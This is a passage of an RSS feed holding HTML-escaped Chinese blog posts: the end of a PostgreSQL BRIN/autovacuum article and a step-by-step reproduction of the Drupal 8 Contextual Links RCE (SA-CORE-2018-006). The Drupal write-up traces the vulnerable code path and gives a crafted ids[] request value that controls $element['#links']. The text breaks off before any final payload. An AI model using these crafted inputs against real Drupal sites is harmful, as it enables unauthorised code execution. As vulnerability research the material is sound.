autoanalyze_count   | 3&lt;/code&gt;&lt;p&gt;发现 &lt;code class=&quot;inline&quot;&gt;last_autovacuum&lt;/code&gt; 一直为空，而 &lt;code class=&quot;inline&quot;&gt;autoanalyze&lt;/code&gt; 能够预期地按照一定频率运行。原来在 &lt;code class=&quot;inline&quot;&gt;do_autovacuum&lt;/code&gt; 函数执行时，大致可分为 &lt;code class=&quot;inline&quot;&gt;dovacuum&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;doanalyze&lt;/code&gt; 和 &lt;code class=&quot;inline&quot;&gt;doworkitems&lt;/code&gt; 等过程，而其中的 &lt;code class=&quot;inline&quot;&gt;relation_needs_vacanalyze&lt;/code&gt; 函数将判断关系表是否需要做 &lt;code class=&quot;inline&quot;&gt;vacuum&lt;/code&gt; 或 &lt;code class=&quot;inline&quot;&gt;analyze&lt;/code&gt;。在仅插入的场景下，表的 &lt;code class=&quot;inline&quot;&gt;n_dead_tup&lt;/code&gt; 很小（本例中没有行被更新或删除，&lt;code class=&quot;inline&quot;&gt;n_dead_tup&lt;/code&gt; 为 0），如果只调整 &lt;code class=&quot;inline&quot;&gt;autovacuum&lt;/code&gt; 的运行频率等配置，&lt;code class=&quot;inline&quot;&gt;dovacuum&lt;/code&gt; 也可能不会被触发。&lt;/p&gt;&lt;blockquote&gt; A table needs to be vacuumed if the number of dead tuples exceeds a threshold.  This threshold is calculated as&lt;br&gt; threshold = vac_base_thresh + vac_scale_factor * reltuples&lt;/blockquote&gt;&lt;p&gt;当然，前面说明了 &lt;code class=&quot;inline&quot;&gt;autosummarize&lt;/code&gt; 需要依赖 &lt;code class=&quot;inline&quot;&gt;do_autovacuum&lt;/code&gt; 中的 &lt;code class=&quot;inline&quot;&gt;doworkitems&lt;/code&gt; 来进行处理，如果 &lt;code class=&quot;inline&quot;&gt;autovacuum&lt;/code&gt; 没有运行，则 &lt;code class=&quot;inline&quot;&gt;autosummarize&lt;/code&gt; 也是无效的。&lt;/p&gt;&lt;h2&gt;Reference&lt;/h2&gt;&lt;p&gt;[1]: &lt;a href=&quot;https://mp.weixin.qq.com/s/4MF9yMzoJQdk0Qa4jw2xSQ&quot;&gt;PostgreSQL中BRIN和BTREE索引的比较&lt;/a&gt; &lt;/p&gt;&lt;p&gt;[2]: &lt;a href=&quot;https://github.com/postgres/postgres/blob/322548a8abe225f2cfd6a48e07b99e2711d28ef7/src/backend/access/brin/brin_revmap.c#L197&quot;&gt;GitHub - brin_revmap.c&lt;/a&gt; &lt;/p&gt;&lt;p&gt;[3]: &lt;a href=&quot;https://github.com/postgres/postgres/blob/322548a8abe225f2cfd6a48e07b99e2711d28ef7/src/backend/access/brin/brin.c#L190&quot;&gt;GitHub - brin.c&lt;/a&gt; &lt;/p&gt;&lt;p&gt;[4]: &lt;a href=&quot;https://github.com/postgres/postgres/blob/322548a8abe225f2cfd6a48e07b99e2711d28ef7/src/backend/postmaster/autovacuum.c#L2559&quot;&gt;GitHub - autovacuum.c&lt;/a&gt;&lt;/p&gt;</description>
<author>明明里</author>
<guid isPermaLink="false">2018-11-26-50167673</guid>
<pubDate>Mon, 26 Nov 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>Drupal Contextual Link RCE</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-11-13-49558602.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/49558602&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-085bfea8e95a519fcf22af1bf24c3c58_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;0x00 参考链接&lt;/b&gt;&lt;br&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;官方预警：https://www.drupal.org/sa-core-2018-006&lt;/li&gt;&lt;li&gt;commit：&lt;br&gt;https://github.com/drupal/drupal/commit/c8f0c39ca488cc29ed575b61c0acf45845d8efed#diff-483e0dea92d8d5caf8024c4a621b9ef5R374&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;0x01 前言&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;10 月 17 日，Drupal 官方发布安全更新 SA-CORE-2018-006 ，修复了 5 个安全漏洞，其中包括 2 个高危漏洞和 3 个中危漏洞。其中 2 个高危漏洞为远程代码执行漏洞。&lt;/p&gt;&lt;p&gt;这里对其中 Drupal 8 Contextual Links 验证问题导致远程代码执行的漏洞进行复现。&lt;/p&gt;&lt;p&gt;根据官方漏洞简要说明得知该漏洞首先需要拥有 &lt;code class=&quot;inline&quot;&gt;Contextual Links&lt;/code&gt; 模块的权限，并且由于对请求的links缺乏很好的验证导致了rce。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a0426c2fd871d4824827873c891fd8a5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;742&quot; data-rawheight=&quot;140&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-a0426c2fd871d4824827873c891fd8a5&quot; data-watermark-src=&quot;v2-7f1a123e4c8c3942c9ef4542f1e859d4&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;查看commit内容，怀疑如下内容为漏洞入口&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-cd7c622c24320d6cc8f33f3d1c7ed53c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;910&quot; data-rawheight=&quot;411&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-cd7c622c24320d6cc8f33f3d1c7ed53c&quot; data-watermark-src=&quot;v2-51f5cfb9ca6a743ab2d19fb4b69f96d1&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;0x02 环境搭建&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;通过如下命令搭建好drupal 8.5.2版本。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-f0ff97c72bd86f6c9a175925788b3379_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;740&quot; data-rawheight=&quot;96&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;根据权限要求登录管理账号添加 &lt;code class=&quot;inline&quot;&gt;Contextual Links&lt;/code&gt; 模块权限，之后退出账号。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-8a7bbbfb5dcbaef803695abbfcef0bf4_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;900&quot; data-rawheight=&quot;216&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-8a7bbbfb5dcbaef803695abbfcef0bf4&quot; data-watermark-src=&quot;v2-26bf5c19825ea1840541ef1de1da58f0&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;0x03 过程调试&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;配置好代理burpsuite后，访问主页可抓取到如下请求。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-51a0afe19e419624b13b068f7b0b32e3_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;901&quot; data-rawheight=&quot;261&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-51a0afe19e419624b13b068f7b0b32e3&quot; data-watermark-src=&quot;v2-770d354a77fd778810b3e8cf8a650203&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;在 &lt;code class=&quot;inline&quot;&gt;core/modules/contextual/src/ContextualController.php&lt;/code&gt; 的 &lt;code class=&quot;inline&quot;&gt;render&lt;/code&gt; 函数中挂上断点，并只保留如下 &lt;code class=&quot;inline&quot;&gt;ids&lt;/code&gt; 内容: &lt;code class=&quot;inline&quot;&gt;ids[]=block:block=bartik_footer:langcode=en|menu:menu=footer:langcode=en&lt;/code&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7c09bf036b5b4f2c121446ab57988e37_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;898&quot; data-rawheight=&quot;221&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7c09bf036b5b4f2c121446ab57988e37&quot; data-watermark-src=&quot;v2-de0afdabab8dc90164cce52754593f96&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-61ee58b4efa50280708fcccbf8a1b207_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;894&quot; data-rawheight=&quot;413&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-61ee58b4efa50280708fcccbf8a1b207&quot; data-watermark-src=&quot;v2-557a9f57668a43830e2e923519afa306&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;其中 &lt;code class=&quot;inline&quot;&gt;#contextual_links&lt;/code&gt; 将会通过 &lt;code class=&quot;inline&quot;&gt;_contextual_id_to_links($id)&lt;/code&gt; 函数获取 ，函数内容如下：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-98b34a76135bfb7c962c84d25bb2efc0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;745&quot; data-rawheight=&quot;364&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-98b34a76135bfb7c962c84d25bb2efc0&quot; data-watermark-src=&quot;v2-3ac6c313068bac49440b1b85fb23f7fa&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;该函数将会将 &lt;code class=&quot;inline&quot;&gt;$id&lt;/code&gt; 的内容通过 &lt;code class=&quot;inline&quot;&gt;|&lt;/code&gt; 拆分，并通过 &lt;code class=&quot;inline&quot;&gt;:&lt;/code&gt; 分割至变量 &lt;code class=&quot;inline&quot;&gt;$group&lt;/code&gt;, &lt;code class=&quot;inline&quot;&gt;$route_parameters_raw&lt;/code&gt;, &lt;code class=&quot;inline&quot;&gt;$metadata_raw&lt;/code&gt;，之后 &lt;code class=&quot;inline&quot;&gt;$route_parameters_raw&lt;/code&gt;, &lt;code class=&quot;inline&quot;&gt;$metadata_raw&lt;/code&gt; 将会经过 &lt;code class=&quot;inline&quot;&gt;parse_str&lt;/code&gt; 解析成变量，并最终赋值给 &lt;code class=&quot;inline&quot;&gt;$contextual_links[$group]&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-48e63b62b5c9d827e9657ac45808cd60_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;898&quot; data-rawheight=&quot;330&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-48e63b62b5c9d827e9657ac45808cd60&quot; data-watermark-src=&quot;v2-2c413d66b763bef9d7da9aa7dea988ee&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这里将 &lt;code class=&quot;inline&quot;&gt;ids&lt;/code&gt; 内容再缩短至： &lt;code class=&quot;inline&quot;&gt;ids[]=block:block=bartik_footer:langcode=en&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7f1866a5f9bde1ba83cccf673cb6493f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;901&quot; data-rawheight=&quot;448&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7f1866a5f9bde1ba83cccf673cb6493f&quot; data-watermark-src=&quot;v2-98b330ec5daabc2b6da1b5f750b4ea4e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;之后进入 &lt;code class=&quot;inline&quot;&gt;renderRoot&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9fc7cca3f5e686f79a884dbf60f42da6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;898&quot; data-rawheight=&quot;299&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9fc7cca3f5e686f79a884dbf60f42da6&quot; data-watermark-src=&quot;v2-0cdbe5e12f867917fee84473e3896677&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;继续跟进 &lt;code class=&quot;inline&quot;&gt;executeInRenderContext&lt;/code&gt; 函数，其中将 &lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;render($elements, TRUE)&lt;/code&gt; 作为回调函数&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2c4151fa493536aceec3edcd18d0f249_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;898&quot; data-rawheight=&quot;252&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-2c4151fa493536aceec3edcd18d0f249&quot; data-watermark-src=&quot;v2-f2aa2f87355d001ad2d10613ff1e7c11&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-539e099be7d76f260b91fe2948adfa8d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;317&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-539e099be7d76f260b91fe2948adfa8d&quot; data-watermark-src=&quot;v2-c91d0fc8e4902366f720d1f1ba5d89d7&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b76d16a117d891bd21dddfcad62b6b54_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;491&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-b76d16a117d891bd21dddfcad62b6b54&quot; data-watermark-src=&quot;v2-9db6383a01f2a5c4f345f6a75032bfd4&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;render&lt;/code&gt; 最终将会进入 &lt;code class=&quot;inline&quot;&gt;doRender&lt;/code&gt; 函数。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-006fa5535b26ee565297f96c069d41e0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;900&quot; data-rawheight=&quot;394&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-006fa5535b26ee565297f96c069d41e0&quot; data-watermark-src=&quot;v2-1a02be1d38d88f8d3faf24e2950e4dc4&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;之后经过 &lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;elementInfo-&amp;gt;getInfo&lt;/code&gt; 函数。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b666a2a8af6952fc6f58f0aee3904cb9_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;897&quot; data-rawheight=&quot;506&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-b666a2a8af6952fc6f58f0aee3904cb9&quot; data-watermark-src=&quot;v2-71d99435a45a1f1e6460ce622e31b277&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这里主要是增加一些新属性。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7643e7e8436c89e49441817429525e2b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;904&quot; data-rawheight=&quot;441&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7643e7e8436c89e49441817429525e2b&quot; data-watermark-src=&quot;v2-87422627ee38c0cf71154b6b92fa6bb4&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;其中添加了 &lt;code class=&quot;inline&quot;&gt;#pre_render&lt;/code&gt; 将会进入预处理 &lt;code class=&quot;inline&quot;&gt;preRenderLinks&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-b80c79f4f151cd2325aaaa12d583e248_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;325&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-b80c79f4f151cd2325aaaa12d583e248&quot; data-watermark-src=&quot;v2-4de3a521956c44fb1c27dd47babd8ba1&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;其中跟进 &lt;code class=&quot;inline&quot;&gt;$contextual_links_manager-&amp;gt;getContextualLinksArrayByGroup&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-9d4b2098d14198913c07fad81d37f25d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;900&quot; data-rawheight=&quot;352&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9d4b2098d14198913c07fad81d37f25d&quot; data-watermark-src=&quot;v2-272a2310ffff608a5021d78609b23317&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这里将会通过 &lt;code class=&quot;inline&quot;&gt;$group_name&lt;/code&gt; 在 &lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;pluginsByGroup&lt;/code&gt; 进行一个匹配搜索，这里匹配成功进入后续循环体。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-94bc51f97e106afb6891ca8380ae60ec_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;901&quot; data-rawheight=&quot;372&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-94bc51f97e106afb6891ca8380ae60ec&quot; data-watermark-src=&quot;v2-643c7396fc0a7b6f3cfbadd3c6627290&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-81205008b4b1c6258d736c80947a0751_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;587&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-81205008b4b1c6258d736c80947a0751&quot; data-watermark-src=&quot;v2-49a4fea1ba22333ca5a3e4c3ca07aedc&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;但是这里由于并没有登录，所有没有访问权限跳出循环体，导致 &lt;code class=&quot;inline&quot;&gt;links&lt;/code&gt; 变量为空。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-0aaefc2cdeb051d558612aef6683590d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;898&quot; data-rawheight=&quot;447&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-0aaefc2cdeb051d558612aef6683590d&quot; data-watermark-src=&quot;v2-310b25bdca0b92c4ea026961f54d6eba&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;从而 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#links&#39;]&lt;/code&gt; 也为空，之后进入 &lt;code class=&quot;inline&quot;&gt;alter&lt;/code&gt;，这里函数内容过程，主要关注最后的 &lt;code class=&quot;inline&quot;&gt;$function($data, $context1, $context2);&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c3fd7481781a8021849acbb80c581ec8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;902&quot; data-rawheight=&quot;332&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c3fd7481781a8021849acbb80c581ec8&quot; data-watermark-src=&quot;v2-c8811ecc8f05c423927d2756b7d9af93&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-e33c302300ecd54aba332aa92d5c2602_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;900&quot; data-rawheight=&quot;250&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e33c302300ecd54aba332aa92d5c2602&quot; data-watermark-src=&quot;v2-f1299a890a4e610d497ff40565a08337&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;将会依次调用 &lt;code class=&quot;inline&quot;&gt;contextual_contextual_links_view_alter&lt;/code&gt; 和 &lt;code class=&quot;inline&quot;&gt;views_ui_contextual_links_view_alter&lt;/code&gt;&lt;/p&gt;&lt;p&gt;其中 &lt;code class=&quot;inline&quot;&gt;contextual_contextual_links_view_alter&lt;/code&gt; 代码如下：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-30f09a6c7e861a545681f01d7398ec29_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;900&quot; data-rawheight=&quot;409&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-30f09a6c7e861a545681f01d7398ec29&quot; data-watermark-src=&quot;v2-e0ab7b28ced7ef06cf7ac9c6f8509f48&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;可以看到，当存在 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#contextual_links&#39;][&#39;contextual&#39;])&lt;/code&gt; 时，将会将 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#contextual_links&#39;][&#39;contextual&#39;][&#39;metadata&#39;][&#39;contextual-views-field-links&#39;]&lt;/code&gt; 内容赋值给 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#links&#39;]&lt;/code&gt;，这由于我们的 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#contextual_links&#39;][&#39;contextual&#39;])&lt;/code&gt; 没有设置，所以 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#links&#39;]&lt;/code&gt; 依旧为空，但是这部分我们是可控的。&lt;/p&gt;&lt;p&gt;之后执行完函数回到之前时，由于 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#links&#39;]&lt;/code&gt; 为空，则设置 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#printed&#39;] = TRUE;&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-31e99a95c39157a718a7383b385c7ac8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;576&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-31e99a95c39157a718a7383b385c7ac8&quot; data-watermark-src=&quot;v2-ffcd2886812efb2690958338c955b6fc&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这将导致返回空字符串内容。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-63fc64a0f3c22237b012df8e2ace1fdf_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;898&quot; data-rawheight=&quot;599&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-63fc64a0f3c22237b012df8e2ace1fdf&quot; data-watermark-src=&quot;v2-551ebfa498b36e10a81fbca750fba619&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-94dd1d915ccdeb1ca4c12bb7c8cc29c8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;245&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-94dd1d915ccdeb1ca4c12bb7c8cc29c8&quot; data-watermark-src=&quot;v2-6fe071a378a0a026a83cd6b695133371&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;0x04 控制 $element[&#39;#links&#39;] 变量&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;所以我们可通过设置 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#contextual_links&#39;][&#39;contextual&#39;])&lt;/code&gt; 以及 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#contextual_links&#39;][&#39;contextual&#39;][&#39;metadata&#39;][&#39;contextual-views-field-links&#39;]&lt;/code&gt; 来确保 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#links&#39;]&lt;/code&gt; 不为空。&lt;/p&gt;&lt;p&gt;对照 &lt;code class=&quot;inline&quot;&gt;#contextual_links&lt;/code&gt; 中的变量进行修改，并且 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#contextual_links&#39;][&#39;contextual&#39;][&#39;metadata&#39;][&#39;contextual-views-field-links&#39;]&lt;/code&gt; 需要为 &lt;code class=&quot;inline&quot;&gt;json&lt;/code&gt; 格式，并且由于会通过 &lt;code class=&quot;inline&quot;&gt;:&lt;/code&gt; 进行拆分所以 &lt;code class=&quot;inline&quot;&gt;:&lt;/code&gt; 需要进行二次编码。&lt;/p&gt;&lt;p&gt;得到 &lt;code class=&quot;inline&quot;&gt;ids[]=contextual:block=bartik_footer:contextual-views-field-links={&quot;aaa&quot; %253A &quot;bbb&quot;}&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6dd56786b321bf1661dc917761fa39e3_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;744&quot; data-rawheight=&quot;100&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;成功设置 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#links&#39;]&lt;/code&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-ee2a0438c59f4f448cb4ff050df9f85c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;387&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-ee2a0438c59f4f448cb4ff050df9f85c&quot; data-watermark-src=&quot;v2-288ec0865dc69bd96627867e8f5aaff4&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;0x05 寻找漏洞触发点&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;$element[&#39;#links&#39;]&lt;/code&gt; 虽然可控但是距离触发漏洞还有一定的距离，继续在 &lt;code class=&quot;inline&quot;&gt;doRender&lt;/code&gt; 函数中查找漏洞触发点。&lt;/p&gt;&lt;p&gt;调试过之前drupal drupalgeddon漏洞的同学应该会知道，如果对 &lt;code class=&quot;inline&quot;&gt;$elements&lt;/code&gt; 数组变量可控，可通过设置 &lt;code class=&quot;inline&quot;&gt;$elements[&#39;#pre_render&#39;]&lt;/code&gt; 来触发 &lt;code class=&quot;inline&quot;&gt;call_user_func&lt;/code&gt; 来达到RCE的目的，这里严重怀疑该漏洞也是通过该种方法得以触发。&lt;/p&gt;&lt;p&gt;继续调试，跟进 &lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;theme-&amp;gt;render&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-06a56ad7932c30744a56c618362e6f18_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;479&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-06a56ad7932c30744a56c618362e6f18&quot; data-watermark-src=&quot;v2-679e160b056abd16291678cc353bbaf3&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;经过一系列繁琐的操作后将会依次调用如下函数，其中 &lt;code class=&quot;inline&quot;&gt;$variables[links]&lt;/code&gt; 为我们所控。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-35a4c6c1f69ebc637544fd12a847ea3d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;900&quot; data-rawheight=&quot;395&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-35a4c6c1f69ebc637544fd12a847ea3d&quot; data-watermark-src=&quot;v2-f6cdba1ec2a8642bed65195701bca4dc&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;跟进其中的 &lt;code class=&quot;inline&quot;&gt;template_preprocess_links&lt;/code&gt; 函数，部分内容如下：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d66f2e40123f6fa5b245403f94ad5f77_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;795&quot; data-rawheight=&quot;935&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-d66f2e40123f6fa5b245403f94ad5f77&quot; data-watermark-src=&quot;v2-cbbb9a85ebb50ddc4f8a361566d1a7bd&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;其中 &lt;code class=&quot;inline&quot;&gt;$link_element&lt;/code&gt; 将通过 &lt;code class=&quot;inline&quot;&gt;$link&lt;/code&gt; 变量进行设置，可以看到我们可控制其中的 &lt;code class=&quot;inline&quot;&gt;#title&lt;/code&gt;，&lt;code class=&quot;inline&quot;&gt;#options&lt;/code&gt;，&lt;code class=&quot;inline&quot;&gt;#url&lt;/code&gt; 以及 &lt;code class=&quot;inline&quot;&gt;#ajax&lt;/code&gt; 变量，这里由于传递的为 &lt;code class=&quot;inline&quot;&gt;{&quot;aaa&quot;:&quot;bbb&quot;}&lt;/code&gt; ，所以 &lt;code class=&quot;inline&quot;&gt;&quot;bbb&quot;&lt;/code&gt; 不为数组导致报错。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0e1b7dd67bcb506273b25b1c7c0b639e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; 